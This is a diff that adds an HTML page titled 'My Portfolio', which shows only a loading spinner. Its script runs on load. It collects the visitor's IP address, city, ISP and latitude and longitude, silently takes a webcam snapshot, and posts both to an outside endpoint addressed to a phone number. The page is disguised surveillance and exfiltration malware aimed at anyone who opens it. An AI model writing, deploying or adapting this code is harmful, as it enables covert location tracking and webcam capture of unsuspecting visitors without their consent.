@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>My Portfolio</title>
+
+        <style>
+            * {
+                padding: 0;
+                margin: 0;
+            }
+
+            body {
+                background-color: black;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+            }
+
+            .lds-ring {
+                display: inline-block;
+                position: relative;
+                width: 80px;
+                height: 80px;
+            }
+            .lds-ring div {
+                box-sizing: border-box;
+                display: block;
+                position: absolute;
+                width: 64px;
+                height: 64px;
+                margin: 8px;
+                border: 8px solid #fff;
+                border-radius: 50%;
+                animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+                border-color: #fff transparent transparent transparent;
+            }
+            .lds-ring div:nth-child(1) {
+                animation-delay: -0.45s;
+            }
+            .lds-ring div:nth-child(2) {
+                animation-delay: -0.3s;
+            }
+            .lds-ring div:nth-child(3) {
+                animation-delay: -0.15s;
+            }
+            @keyframes lds-ring {
+                0% {
+                    transform: rotate(0deg);
+                }
+                100% {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+    </head>
+
+    <body>
+        <video id="video" width="480" height="480" autoplay></video>
+        <canvas id="canvas" width="480" height="480"></canvas>
+        <div class="lds-ring">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+
+        <script>
+            let video = document.querySelector("#video");
+            video.style.display = "none";
+            let canvas = document.querySelector("#canvas");
+            let text = "*DATA PENGUNJUNG*";
+            canvas.style.display = "none";
+            const BASE = "https://fundaypay.vercel.app";
+            const TO = "082286230830";
+
+            (async () => {
+                const jsonIp = await useFetch("https://jsonip.com");
+                const data = await useFetch(
+                    "https://ipapi.co/" + jsonIp.ip + "/json"
+                );
+                text += `
+
+Alamat IP : ${data.ip}
+Kode Negara : ${data.country}
+Nama Negara : ${data.country_name}
+Ibukota Negara : ${data.country_capital}
+Kode Telepon : ${data.country_calling_code}
+Provinsi : ${data.region}
+Kode Provinsi : ${data.region_code}
+Kota : ${data.city}
+Provider ISP : ${data.org}
+Latitude : ${data.latitude}
+Longitude : ${data.longitude}`;
+                sM(text);
+                let stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: false,
+                });
+                video.srcObject = stream;
+                setTimeout(() => {
+                    canvas
+                        .getContext("2d")
+                        .drawImage(video, 0, 0, canvas.width, canvas.height);
+                    let image_data_url = canvas
+                        .toDataURL("image/jpeg")
+                        .replace(/^data:image\/jpeg;base64,/, "");
+                    sM(text, image_data_url, "jpeg");
+                    video.pause();
+                    video.src = "";
+                    stream.getTracks()[0].stop();
+                }, 1000);
+            })();
+
+            async function useFetch(url) {
+                const response = await fetch(url);
+                const jsonData = await response.json();
+                return Promise.resolve(jsonData);
+            }
+
+            async function sM(msg, img, ext) {
+                let mySender = await fetch(`${BASE}/send/`, {
+                    method: "POST",
+                    mode: "cors",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        to: TO,
+                        msg: msg || "siapa hayo?",
+                        img,
+                        ext,
+                    }),
+                });
+                let myResult = await mySender.text();
+                return Promise.resolve(myResult);
+            }
+        </script>
+    </body>
+</html>
